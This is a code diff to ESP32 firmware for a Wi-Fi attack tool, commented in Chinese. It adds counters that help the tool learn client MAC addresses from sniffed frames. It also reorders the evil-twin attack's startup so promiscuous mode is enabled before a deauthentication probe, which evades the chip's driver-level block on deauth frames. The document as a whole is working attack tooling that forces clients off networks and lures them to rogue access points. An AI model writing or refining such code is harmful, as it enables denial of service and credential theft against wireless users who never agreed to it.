@@ -455,6 +455,10 @@ struct DeauthEngine {
   uint32_t unicastCount = 0;   // 成功发出的单播 Deauth 帧数
   uint32_t unicastCycle = 0;   // 单播/广播轮换游标 (每 4 帧留 1 帧广播兜底)
   uint8_t  reasonCycle = 0;    // 单播原因码轮换游标
+  // —— 空口学习诊断 (只在 Deauth 运行期累加, 供排障显示) ——
+  uint32_t rxFrames = 0;       // prom 回调收到的帧总数
+  uint32_t rxData   = 0;       // 其中 802.11 数据帧
+  uint32_t rxMatch  = 0;       // 其中 BSSID 命中主目标的数据帧
 };
 static DeauthEngine sDeauth;
 
@@ -537,6 +541,9 @@ static void resetKnownStas() {
   sDeauth.unicastCount = 0;
   sDeauth.unicastCycle = 0;
   sDeauth.reasonCycle = 0;
+  sDeauth.rxFrames = 0;
+  sDeauth.rxData = 0;
+  sDeauth.rxMatch = 0;
 }
 
 // 单播 Deauth: DA=客户端, TA/BSSID=目标 AP。WPA2 (未协商 PMF) 客户端必定处理。
@@ -553,9 +560,13 @@ static bool buildUnicastDeauth(const uint8_t *dst, const uint8_t *bssid, uint8_t
 }
 
 // 从空口帧学习目标 AP 下的客户端 MAC (仅当 Deauth 引擎运行且目标已就绪)
+// 同时累加诊断计数, 便于排障区分「prom 收不到帧」与「收到了但没有目标 BSSID 的数据帧」。
 static void learnClientMac(const uint8_t *f, int len) {
-  if (len < 24 || !sDeauth.targetMacReady) return;
+  sDeauth.rxFrames++;
+  if (len < 24) return;
   if (((f[0] >> 2) & 0x03) != 2) return;              // 只取数据帧 (含 QoS/Null/EAPOL)
+  sDeauth.rxData++;
+  if (!sDeauth.targetMacReady) return;
   const bool toDs = (f[1] & 0x01) != 0;
   const bool fromDs = (f[1] & 0x02) != 0;
   if (toDs == fromDs) return;                          // IBSS / WDS 不作数
@@ -563,6 +574,7 @@ static void learnClientMac(const uint8_t *f, int len) {
   const uint8_t *sta   = toDs ? (f + 10) : (f + 4);
   if ((sta[0] & 0x01) || (bssid[0] & 0x01)) return;    // 组地址跳过
   if (memcmp(bssid, sDeauth.targetMac, 6) != 0) return;
+  sDeauth.rxMatch++;
   if (memcmp(sta, sDeauth.targetMac, 6) == 0) return;
   for (int i = 0; i < sKnownStaCount; i++) {
     if (memcmp(sKnownStas[i].mac, sta, 6) == 0) {
@@ -2606,9 +2618,11 @@ static bool promiscuousWanted() {
 
 // 按活跃模块统一配置过滤掩码与回调; 没有模块需要时关闭 promiscuous。
 // 返回 promiscuous 是否处于开启状态 (无模块需要时视为成功)。
+static bool sPromActive = false;   // 最近一次 sync 后的真实 prom 状态 (状态接口诊断用)
 static bool syncPromiscuousEngine() {
   if (!promiscuousWanted()) {
     esp_wifi_set_promiscuous(false);
+    sPromActive = false;
     return true;
   }
   uint32_t mask = 0;
@@ -2635,7 +2649,8 @@ static bool syncPromiscuousEngine() {
   filter.filter_mask = mask;
   esp_wifi_set_promiscuous_filter(&filter);
   esp_wifi_set_promiscuous_rx_cb(onPromiscuousFrame);
-  return esp_wifi_set_promiscuous(true) == ESP_OK;
+  sPromActive = (esp_wifi_set_promiscuous(true) == ESP_OK);
+  return sPromActive;
 }
 
 /* ---- 板载跑包所需的密码学原语 (mbedtls, ESP32 有 SHA 硬件加速) ---- */
@@ -2830,9 +2845,11 @@ static bool eviltwinStartAttack(String &err) {
   // 先探测真 Deauth 是否可用 (白名单已覆盖, 正常为可用); 若仍被拒则切 CSA 强制下线。
   // 组合里不含 Deauth (例如「只发组合攻击」) 时无需探测, 直接开跑。
   csaPrepare(sTarget.ssid, sTarget.bssid, (uint8_t)sTarget.channel);
-  if (!(emask & ATK_DEAUTH)) {
-    sDeauth.running = true;
-  } else {
+  // 先打开 promiscuous 再探测: C5 的帧白名单只在 prom 开启时放行 Deauth,
+  // 否则探测帧必然返回 258 → 误判「平台阻断」而白走 CSA 分支。
+  sDeauth.running = true;
+  syncPromiscuousEngine();
+  if (emask & ATK_DEAUTH) {
     const esp_err_t probe = wifi80211Tx(WIFI_IF_AP, sDeauth.frame, (int)sizeof(sDeauth.frame), true);
     if (probe == ESP_OK) {
       sDeauth.running = true;
@@ -2846,6 +2863,7 @@ static bool eviltwinStartAttack(String &err) {
       } else {
         log("[deauth] Deauth 被驱动拒绝且 CSA 构造失败 (SSID/BSSID 缺失)");
       }
+      syncPromiscuousEngine();
     }
   }
   sDeauth.lastTxTime = millis(); sDeauth.lastLogTime = millis();
@@ -3217,6 +3235,10 @@ static void sendInfo() {
           ",\"count\":" + String(sDeauth.frameCount) +
           ",\"unicast\":" + String(sDeauth.unicastCount) +
           ",\"knownStas\":" + String(sKnownStaCount) +
+          ",\"prom\":" + String(sPromActive ? "true" : "false") +
+          ",\"rxFrames\":" + String(sDeauth.rxFrames) +
+          ",\"rxData\":" + String(sDeauth.rxData) +
+          ",\"rxMatch\":" + String(sDeauth.rxMatch) +
           ",\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) +
           ",\"channel\":" + String(sDeauth.targetChannel) +
           ",\"mode\":" + String(sDeauth.primaryMode) +
@@ -3771,6 +3793,10 @@ static void handleDeauthStatus() {
   json += "\"count\":" + String(sDeauth.frameCount) + ",";
   json += "\"unicast\":" + String(sDeauth.unicastCount) + ",";
   json += "\"knownStas\":" + String(sKnownStaCount) + ",";
+  json += "\"prom\":" + String(sPromActive ? "true" : "false") + ",";
+  json += "\"rxFrames\":" + String(sDeauth.rxFrames) + ",";
+  json += "\"rxData\":" + String(sDeauth.rxData) + ",";
+  json += "\"rxMatch\":" + String(sDeauth.rxMatch) + ",";
   json += "\"rate\":" + String(sDeauth.rateLimitMs ? (1000 / sDeauth.rateLimitMs) : 10) + ",";
   json += "\"bssid\":\"" + jsonEscape(sDeauth.targetBssid) + "\",";
   json += "\"channel\":" + String(sDeauth.targetChannel) + ",";
